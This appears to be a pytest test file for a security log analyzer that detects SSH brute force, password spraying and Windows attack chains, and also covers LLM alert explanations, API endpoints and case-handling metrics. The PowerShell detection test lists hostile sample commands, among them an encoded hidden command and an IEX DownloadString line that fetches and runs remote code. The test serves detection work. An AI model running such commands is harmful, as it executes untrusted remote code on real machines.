import os, tempfile
import pandas as pd
from fastapi.testclient import TestClient
from src.generator import generate_linux_log, generate_windows_log
from src.pipeline import analyze_text
from src.parser import parse_text
from src import llm


def _rules(alerts):
    return {(a["rule"], a["source_ip"]) for a in alerts}


def test_linux_attacks_detected_exactly():
    lines, truth = generate_linux_log()
    _, alerts = analyze_text("\n".join(lines))
    got = _rules(alerts)
    assert ("brute_force", truth["brute_force"]) in got
    assert ("success_after_failures", truth["success_after_failures"]) in got
    assert ("password_spraying", truth["password_spraying"]) in got
    assert ("invalid_user_probing", truth["invalid_user_probing"]) in got
    assert ("odd_hour_login", truth["odd_hour_login"]) in got
    assert len(alerts) == 5            # no false positives from normal traffic


def test_windows_attack_chain_detected_exactly():
    lines, truth = generate_windows_log()
    _, alerts = analyze_text("\n".join(lines))
    # every stage of the chain is found, and benign PowerShell / non-admin group changes raise nothing
    assert _rules(alerts) == set(truth.items())
    top = alerts[0]
    assert top["severity"] == "Critical"


def test_windows_event_ids_parsed():
    lines, _ = generate_windows_log()
    df = parse_text("\n".join(lines))
    assert {"login", "user_created", "group_add", "lockout", "process", "log_cleared"} <= set(df["event_type"])
    # old 5-column Windows CSVs still parse
    old = "timestamp,host,event_id,user,ip\n2026-09-28 08:00:00,WIN-DC01,4625,bob,10.0.0.5"
    assert parse_text(old).iloc[0]["status"] == "failure"


def test_powershell_rule_precision():
    from src.detector import CONFIG
    import re
    pat = re.compile(CONFIG["suspicious_powershell"]["pattern"])
    bad = ["powershell.exe -nop -w hidden -enc AAAA", "powershell -EncodedCommand AAAA",
           "powershell IEX (New-Object Net.WebClient).DownloadString('http://x')"]
    good = [r"powershell.exe -File C:\Scripts\backup.ps1", "powershell.exe Get-Service"]
    assert all(pat.search(c) for c in bad) and not any(pat.search(c) for c in good)


def test_edge_cases():
    for bad in ["", "   \n", "garbage line\nanother one", "timestamp,host,event_id,user,ip\nnot,a,valid,row,x"]:
        df, alerts = analyze_text(bad)
        assert alerts == []


def test_scoring_and_mitre():
    lines, _ = generate_linux_log()
    _, alerts = analyze_text("\n".join(lines))
    assert alerts[0]["severity"] == "Critical" and alerts[0]["rule"] == "success_after_failures"
    assert all(a["mitre"]["id"].startswith("T1") for a in alerts)
    assert [a["risk_score"] for a in alerts] == sorted([a["risk_score"] for a in alerts], reverse=True)


def test_llm_fallback_and_hallucination_check(monkeypatch):
    lines, _ = generate_linux_log()
    _, alerts = analyze_text("\n".join(lines))
    monkeypatch.setattr(llm, "ollama_available", lambda *a, **k: False)
    ex = llm.explain_alert(alerts[0])
    assert ex["source"] == "template-fallback" and "## Recommended Actions" in ex["text"]
    assert llm.check_hallucination("attacker 9.9.9.9 and " + alerts[0]["source_ip"], alerts[0]) == ["9.9.9.9"]


def test_llm_ollama_path(monkeypatch):
    lines, _ = generate_linux_log()
    _, alerts = analyze_text("\n".join(lines))
    monkeypatch.setattr(llm, "ollama_available", lambda *a, **k: True)
    monkeypatch.setattr(llm, "call_ollama", lambda p, model=None, timeout=0: "## Summary\nAttack from 8.8.8.8")
    ex = llm.explain_alert(alerts[0])
    assert ex["source"].startswith("ollama") and ex["warnings"]


def test_api_end_to_end(monkeypatch):
    tmp = tempfile.mkdtemp()
    monkeypatch.setenv("SOC_DB", os.path.join(tmp, "t.db"))
    from src import db
    monkeypatch.setattr(db, "DB_PATH", os.path.join(tmp, "t.db"))
    from api.main import app
    monkeypatch.setattr(llm, "ollama_available", lambda *a, **k: False)
    c = TestClient(app)
    lines, _ = generate_linux_log()
    r = c.post("/upload-logs", files={"file": ("auth.log", "\n".join(lines))})
    assert r.status_code == 200 and len(r.json()["alerts"]) == 5
    aid = r.json()["alerts"][0]["id"]
    assert c.get(f"/alerts/{aid}").json()["rule"] == "success_after_failures"
    assert "Summary" in c.post(f"/alerts/{aid}/explain").json()["text"]
    assert c.get(f"/alerts/{aid}").json()["report"] is not None
    assert "Incident Report" in c.get(f"/report/{r.json()['upload_id']}").json()["markdown"]
    assert c.post("/upload-logs", files={"file": ("x.log", "nothing here")}).status_code == 400
    assert c.get("/alerts/9999").status_code == 404
    assert c.get("/stats").json()["alerts"] == 5


def test_case_workflow_and_metrics(tmp_path):
    from src import db
    path = str(tmp_path / "cases.db")
    db.init_db(path)
    lines, _ = generate_linux_log()
    df, alerts = analyze_text("\n".join(lines))
    _, ids = db.save_analysis("auth.log", df, alerts, path=path)
    assert all(r["status"] == "New" for r in db.list_alerts(path=path))

    db.assign(ids[0], "alice", "lead", path=path)
    db.update_status(ids[0], "Escalated", "alice", note="root compromised, handing to IR", path=path)
    db.update_status(ids[0], "Closed", "alice", "True Positive", path=path)
    db.update_status(ids[1], "Closed", "bob", "False Positive", path=path)
    try:
        db.update_status(ids[2], "Closed", "bob", path=path)        # no disposition
        assert False, "closing without a disposition must fail"
    except ValueError:
        pass

    a = db.get_alert(ids[0], path=path)
    assert a["status"] == "Closed" and a["disposition"] == "True Positive" and a["assignee"] == "alice"
    actions = [e["action"] for e in db.get_activity(ids[0], path=path)]
    assert actions == ["created", "assign", "status", "note", "status"]

    m = db.case_metrics(path=path)
    assert m["closed"] == 2 and m["open"] == len(alerts) - 2
    assert m["false_positive_rate_pct"] == 50.0
    assert m["mtta_minutes"] is not None and m["mttr_minutes"] is not None
    assert {r["rule"] for r in m["fp_rate_by_rule"]} == {alerts[0]["rule"], alerts[1]["rule"]}


def test_case_api(monkeypatch, tmp_path):
    from src import db
    monkeypatch.setattr(db, "DB_PATH", str(tmp_path / "api.db"))
    db.init_db()
    from api.main import app
    c = TestClient(app)
    lines, _ = generate_linux_log()
    aid = c.post("/upload-logs", files={"file": ("auth.log", "\n".join(lines))}).json()["alerts"][0]["id"]
    assert c.patch(f"/alerts/{aid}/assign", json={"assignee": "alice"}).json()["assignee"] == "alice"
    assert c.patch(f"/alerts/{aid}/status", json={"status": "Closed"}).status_code == 422
    r = c.patch(f"/alerts/{aid}/status", json={"status": "Closed", "disposition": "True Positive", "note": "confirmed"})
    assert r.json()["status"] == "Closed"
    assert len(c.post(f"/alerts/{aid}/notes", json={"text": "lessons learned"}).json()) == 5
    assert c.get(f"/alerts/{aid}/activity").json()[-1]["detail"] == "lessons learned"
    assert c.get("/metrics").json()["closed"] == 1
    assert c.get("/alerts?status=Closed").json()[0]["id"] == aid
    assert c.patch("/alerts/9999/status", json={"status": "New"}).status_code == 404


def test_key_only_ssh_failures_recover_ip_by_pid():
    log = "\n".join([
        "Dec  7 05:20:40 srv sshd[100]: Connection from 203.0.113.9 port 4242 on 10.0.0.1 port 22",
        "Dec  7 05:20:47 srv sshd[100]: Disconnecting: Too many authentication failures for root [preauth]",
        "Dec  7 05:20:52 srv sshd[200]: Disconnecting: Too many authentication failures for root [preauth]",
        "Dec  7 05:20:53 srv sshd[300]: Invalid user  from 198.51.100.1",
    ])
    df = parse_text(log, year=2014)
    assert list(df["source_ip"]) == ["203.0.113.9", "unknown", "198.51.100.1"]
    assert df.iloc[0]["timestamp"].year == 2014 and df.iloc[2]["user"] == "(empty)"
